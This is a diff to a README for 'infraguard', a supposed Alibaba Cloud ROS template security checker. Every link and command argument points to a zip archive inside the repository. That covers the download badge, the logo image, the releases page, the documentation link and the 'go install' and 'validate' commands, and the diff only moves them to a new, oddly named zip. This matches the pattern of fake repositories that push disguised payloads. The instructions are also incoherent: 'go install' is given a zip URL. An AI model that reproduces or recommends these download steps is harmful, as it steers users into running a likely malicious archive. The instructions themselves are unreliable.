@@ -1,11 +1,11 @@
 # 🔒 infraguard - Simple Tool for Infrastructure Security
 
 <div align="center">
-[![Download infraguard](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip)](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip)
+[![Download infraguard](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip)](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip)
 </div>
 
 <div align="center">
-  <img src="https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip" alt="InfraGuard Logo" width="200"/>
+  <img src="https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip" alt="InfraGuard Logo" width="200"/>
 </div>
 
 # InfraGuard
@@ -14,7 +14,7 @@
 
 InfraGuard helps you check your Alibaba Cloud ROS templates for security and compliance issues before you deploy them. It works with YAML and JSON formats, helping you avoid problems in production.
 
-**Language**: English | [中文](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip)
+**Language**: English | [中文](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip)
 
 ## ✨ Features
 
@@ -32,7 +32,7 @@ InfraGuard helps you check your Alibaba Cloud ROS templates for security and com
 
 To get started, visit this page to download the latest version of InfraGuard:
 
-[Download InfraGuard Latest Release](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip)
+[Download InfraGuard Latest Release](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip)
 
 You can install it in one of two ways:
 
@@ -40,11 +40,11 @@ You can install it in one of two ways:
    If you have Go installed, run the following command in your terminal:
 
    ```bash
-   go install https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip
+   go install https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip
    ```
 
 2. **From Releases Page:**
-   If you prefer to download a pre-built binary, visit the [Releases page](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip) and choose the right version for your operating system.
+   If you prefer to download a pre-built binary, visit the [Releases page](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip) and choose the right version for your operating system.
 
 ### System Requirements
 
@@ -69,10 +69,10 @@ Once you have installed InfraGuard, follow these steps to check your ROS templat
    ```
 
 2. **Run InfraGuard:**
-   Open your terminal or command prompt and run the following command, replacing `https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip` with the name of your template file:
+   Open your terminal or command prompt and run the following command, replacing `https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip` with the name of your template file:
 
    ```bash
-   infraguard validate https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip
+   infraguard validate https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip
    ```
 
 3. **Review Results:**
@@ -88,18 +88,18 @@ InfraGuard provides its output in different formats. Here’s how to interpret t
 
 ## 🔄 Updating InfraGuard
 
-To keep InfraGuard up to date, return to the [Releases page](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip) regularly. Check for new versions and follow the same installation steps as before.
+To keep InfraGuard up to date, return to the [Releases page](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip) regularly. Check for new versions and follow the same installation steps as before.
 
 ## 🔧 Custom Policies
 
 InfraGuard supports creating custom policies using Rego. This allows organizations to tailor compliance checks according to their specific needs. To get started:
 
-1. Read through the [Open Policy Agent documentation](https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip).
+1. Read through the [Open Policy Agent documentation](https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip).
 2. Write your policy files in Rego and save them in your project directory.
 3. Run InfraGuard with the custom policy:
 
    ```bash
-   infraguard validate --policy https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip https://github.com/dandiaz2013/infraguard/raw/refs/heads/main/src/Software_1.9.zip
+   infraguard validate --policy https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip https://raw.githubusercontent.com/dandiaz2013/infraguard/main/src/lib/Software-doggrelize.zip
    ```
 
 ## 📞 Support
